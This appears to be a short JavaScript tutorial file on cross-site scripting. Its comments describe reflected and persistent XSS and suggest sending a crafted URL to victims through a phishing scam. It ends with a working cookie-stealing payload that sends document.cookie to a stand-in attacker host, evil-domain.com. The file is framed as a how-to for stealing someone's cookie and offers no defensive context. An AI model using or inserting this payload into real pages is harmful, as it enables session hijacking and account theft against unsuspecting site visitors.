/*

	Reflective - inject JavaScript to steal cookies or session hijack, if its vulnerable
		you can pass the url over to some user via a fishing scam and steal their stuff
		-The javascript is attached to the URL

	Persistent - you're actually able to inject code into the website so that any time any
		one else visits and you can steal their info (popular on forums)

	Here I will steal someone's cookie!
*/

(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;

/*
	
*/